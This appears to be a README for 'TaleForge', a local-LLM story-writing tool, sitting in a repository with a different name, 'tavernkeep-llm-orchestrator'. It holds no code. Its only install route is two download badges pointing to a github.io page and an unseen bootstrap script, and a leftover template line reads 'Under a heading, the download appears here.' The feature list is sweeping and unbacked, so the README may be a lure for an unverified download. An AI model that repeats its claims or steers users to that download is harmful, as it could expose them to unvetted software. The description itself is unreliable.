![preview](https://raw.githubusercontent.com/Muzammil076/tavernkeep-llm-orchestrator/main/thumb_cede.svg)

# TaleForge

**TaleForge** is a self-hosted narrative engine that turns your local hardware into a collaborative world-building studio. Where other tools merely generate text, TaleForge orchestrates entire story universes—managing characters, lore consistency, scene continuity, and branching plotlines—all powered by your own private language models, with zero cloud dependencies and a warm, human-friendly interface.

---

## 📖 Overview

Traditional AI writing tools treat storytelling like a chat window: you prompt, the model replies, and you copy-paste the results into a document. That workflow breaks down the moment your story grows beyond a single scene. Characters forget their motives, timelines contradict themselves, and the "magic" of spontaneous creation gets lost in a sea of manual notes.

TaleForge reimagines the process from the ground up. It is not another text generator—it is a **forge** where raw model output is shaped, tempered, and annealed into coherent, enduring fiction. Think of it as a master blacksmith's workshop: the language model is your hammer, but the anvil, the tongs, and the quenching bath are all built into TaleForge's carefully crafted ecosystem.

This project is inspired by the growing community of local-LLM enthusiasts who want full control over their creative tools. It inherits the "zero-friction deployment" philosophy from its sibling project, TavernKeep, but pivots hard toward a single, focused use case: **long-form, multi-session narrative crafting**.

---

## 🔥 Why TaleForge Exists

Most existing solutions fall into two unsatisfying camps:

1. **Cloud-only mega-apps** that require account creation, subscription fees, and hand over your creative work to a third-party server.
2. **Raw framework complexity** that demands hours of configuration before you can write a single sentence.

TaleForge walks a third path. It is a **curated, opinionated, and fully local** experience. You get the convenience of a polished product without surrendering privacy or paying monthly tribute. The entire stack—model orchestration, memory management, UI, and lore database—is designed to work together out of the box, like a well-rehearsed orchestra rather than a collection of soloists.

---

## 🌟 Key Features (The Forge's Toolkit)

### 🧠 Persistent Story Memory (The Tome)
The single biggest flaw in AI storytelling is amnesia. TaleForge introduces **The Tome**—a structured, searchable memory system that automatically extracts and tracks:
- Character traits, relationships, and emotional arcs
- Location descriptions that evolve as the story progresses
- Foreshadowed events and unresolved plot threads
- Consistent timelines (no more "Tuesday" becoming "Thursday" by accident)

The Tome works continuously in the background, updating itself from every scene you write. When you prompt the model, relevant memories are automatically injected as context—so the AI remembers that the scar on the innkeeper's hand came from a dragon burn in Chapter 2, even if you're writing Chapter 20.

### 🌿 Branching Timeline Manager (The Weave)
Stories rarely proceed in a straight line. The Weave lets you:
- Fork your narrative at any point to explore "what-if" scenarios
- Merge divergent branches back into a single trunk
- Visually compare two parallel scenes side-by-side
- Tag branches as canonical, alternate, or discarded

The Weave does not force a rigid flowchart structure. It feels as fluid as a sketchbook, but with the rigor of version control—because every fork is a saved state, not a destructive edit.

### 🎭 Character Voice Locks (The Personas)
Generic models produce generic dialogue. TaleForge's **Persona Locks** let you isolate the "voice" of each character using a separate, lightweight embedding model. You can:
- Lock a character to speak in a specific dialect, cadence, or register
- Prevent characters from suddenly becoming omniscient narrators
- Automatically generate "voice snippets" from any existing story text
- Enforce consistent pronouns, speech patterns, and recurring verbal tics

This feature turns flat text generation into genuine multi-actor performance.

### 🧩 Modular Plugin Spines (The Loom)
A forge grows with its smith. The Loom is a plugin system that lets you extend TaleForge without touching its core:
- **Connectors** to different model backends (llama.cpp, Ollama, LocalAI, etc.)
- **Transformers** for post-processing (e.g., removing anachronisms, enforcing style guides)
- **Exporters** to EPUB, PDF, Markdown, or plain text
- **Analyzers** for word-count, pacing, or sentiment trends

Plugins are written as simple Python files that drop into a `loom` folder. No compilation, no package managers, no version hell.

### 🖥️ Adaptive Web Dashboard
The management interface is a fully responsive, mobile-friendly single-page app. It adapts to your screen size without losing function—the dashboard, the Tome, and the Weave all flex and reflow. Whether you're writing on a desktop monitor or a mid-sized tablet, the experience remains crisp and uncluttered.

### 🌐 Polyglot Narration
Storytelling is not confined to English. TaleForge includes built-in dictionary support for **30+ languages**, including right-to-left scripts. The UI, the Tome's internal labels, and even the auto-generated memory summaries can all be localized. The model itself remains language-agnostic—you simply tell the system which language you are writing in, and it adapts its context-injection strategies accordingly.

---

## 📦 Installation & Setup

### The Zero-Config Promise
TaleForge follows the "one-click stack" tradition from its parent project. A single orchestration script handles:
- ✓ Detection of your hardware (CPU/GPU/RAM)
- ✓ Download and verification of a recommended model (or your existing one)
- ✓ Automatic port forwarding configuration (or local-only mode)
- ✓ Health checks for every component

**Under a heading, the download appears here.**

[![Download](https://raw.githubusercontent.com/Muzammil076/tavernkeep-llm-orchestrator/main/start_9e696.svg)](https://Muzammil076.github.io/tavernkeep-llm-orchestrator/)

No package managers. No manual dependency resolution. Just run the bootstrap, and the forge fires itself up.

### System Requirements (The Anvil)
| Component | Minimum | Recommended |
|-----------|---------|-------------|
| RAM | 8 GB | 16 GB for large models |
| GPU | Integrated (slow) | 6 GB VRAM for real-time generation |
| Storage | 2 GB for app + 4 GB for model | 20+ GB for multi-model cache |
| OS | Windows 10 / Ubuntu 22.04 / macOS 13 | Same, but 64-bit |

The application is intentionally lightweight on system resources beyond the model inference. The UI and Tome are stored in a compact embedded database, so you won't see significant RAM bloat from the management layer itself.

---

## 🚀 Getting Started (Your First Forging)

1. **Launch the bootstrap** – the script will probe your system and present a summary.
2. **Choose a model** – the default recommendation is a carefully tuned 7B-parameter generalist that performs well across fantasy, sci-fi, and literary fiction. You can override this with any GGUF or GPTQ model you already own.
3. **Create a world** – the on-boarding wizard asks about genre, tone, and initial setting. It then seeds the Tome with a few blank templates.
4. **Write your first scene** – type a few paragraphs in the main editor. Under the hood, TaleForge compresses your text into embeddings and stores them for future reference.
5. **Generate a continuation** – hit the "Temper" button. The model receives your scene plus relevant Tome entries and produces the next beat.

The entire flow is designed to be under 5 minutes from first launch to active writing.

---

## 🛠️ Configuration Deep-Dive

### Model Settings (The Bellows)
TaleForge gives granular control over inference parameters:
- **Temperature**: from 0.0 (rigid, deterministic) to 1.5 (chaotic, experimental)
- **Top-P**: nucleus sampling threshold
- **Repetition Penalty**: dynamically adjusts to avoid loops on long generations
- **Context Chunking**: custom logic to fit large Tome entries plus current scene into your model's context window

These settings can be saved as **"writing moods"** — presets like "Surprise Me," "Cozy Slice-of-Life," or "Gritty Noir." Moods are stored locally and apply globally across all worlds.

### Interaction Protocol
TaleForge communicates with your local model via a standard HTTP + JSON interface. It does not require a proprietary SDK. This means:
- It works with any model server that exposes an OpenAI-compatible `/v1/chat/completions` endpoint.
- You can point it at your existing model server without installing new software.
- Security is handled via a local-only bind to `127.0.0.1` by default.

### Data Sovereignty & Privacy
All Tome data, Weave branches, and user settings reside in a single encrypted SQLite file. Nothing ever leaves your machine. Telemetry is **off** by default and cannot be enabled remotely—you must manually inspect and approve any network call beyond localhost.

---

## 📚 The Tome in Action

Imagine you are writing a mystery novel set in a rainy coastal town. The Tome has tracked:
- The detective's habit of twirling a silver pocket watch when nervous
- The cafe owner's secret brotherhood membership
- The precise weather conditions from Chapter 1 to Chapter 14
- A red herring about a supposedly haunted lighthouse

When you prompt the model for a dialogue scene, TaleForge performs a **relevance search** across the entire Tome and selects up to 3,000 tokens of context that best match the current scene's semantics. This is not simple keyword matching—it uses a local embedding model to understand *meaning*. So a question about "smells of salt and diesel" will correctly pull the memory about the harbor, rather than a random memory about a university library.

---

## 🌳 The Weave in Practice

Forking does not require a whole new prompt. Select the paragraph where you want to diverge, click "Fork," and TaleForge creates a new branch. You can:
- Rename branches (e.g., "Chapter 7 - Angry Ending" vs. "Chapter 7 - Happy Ending")
- Compare real-time token-by-token differences between two branches.
- Merge a branch back into the main trunk—conflicting Tome edits are resolved with a simple cursor-based reconciliation panel.

This turns revision from a scary destructive act into an exploratory adventure.

---

## 🔌 Plugin Development (For the Curious)

The Loom API is intentionally tiny. A plugin is a single class with one or more methods:

```
class MyLoomPlugin:
    def on_generate_start(self, context): ...
    def after_generation(self, text): ...
    def on_tome_update(self, entry): ...
```

There is no event loop to manage. No widgets to register. If you can write a Python function, you can write a plugin. The documentation contains a dozen worked examples—from a "plagiarism checker" for accidental echoes of famous books, to a "vibe scorer" that rates the emotional intensity of your prose.

---

## 🧑‍🤝‍🧑 The 24/7 Support Covenant

While the software is completely self-hosted, that does not mean you are alone in the wilderness. The project maintains:
- An active discussion forum (no registration required for reading)
- A weekly "Office Hours" text-based Q&A session via a public lobby
- A comprehensive help manual with step-by-step troubleshooting
- Responsive maintainers who acknowledge bug reports within 48 business hours

We believe that free (as in liberty) software can still have a warm, human face. Our support covenant is a promise, not a disclaimer.

---

## 🛡️ Disclaimer

**TaleForge is provided "as is" without warranty of any kind, express or implied.** The authors are not responsible for:
- Content generated by the language model (which can be erroneous, offensive, or inconsistent)
- Data loss due to hardware failure (always back up your Tome file)
- Any intellectual property concerns arising from your use of trained models

You are solely responsible for understanding your local hardware's thermal limits and for validating the output you choose to publish. The model's creativity is a tool—you are the artisan.

---

## 📄 License

This project is released under the **MIT License**. You are free to use, modify, distribute, and incorporate TaleForge into commercial products, with the sole condition that you retain the original copyright notice.

[Download the full license text here](https://opensource.org/licenses/MIT)

---

## 🙏 Acknowledgments

Inspiration is drawn from the local-LLM community, the original TavernKeep project's deployment philosophy, and the eternal human need to tell stories that outlast their tellers. We also thank the maintainers of the underlying model servers that make local inference possible.

---

## 📁 Repository Structure (High-Level)

- `/core` – the engine (memory, weaving, model orchestration)
- `/ui` – the responsive web dashboard (vanilla JS, no heavy frameworks)
- `/loom` – plugin loader and sample plugins
- `/docs` – full user manual, plugin guide, and troubleshooting wiki
- `/models` – reference configuration files for recommended base models
- `/tools` – migration scripts, import/export utilities

---

## 🏁 Conclusion

TaleForge is not another chat wrapper. It is a **persistent, self-aware narrative companion** that treats your story as a living artifact, not a disposable text stream. Whether you are an amateur hobbyist sketching a first novel or a professional writer juggling a serialized universe, TaleForge molds itself to your process—never the other way around.

The forge is hot. The anvil is waiting. Your story deserves better than a blank prompt box.

**Begin your forging today.**

[![Download](https://raw.githubusercontent.com/Muzammil076/tavernkeep-llm-orchestrator/main/start_9e696.svg)](https://Muzammil076.github.io/tavernkeep-llm-orchestrator/)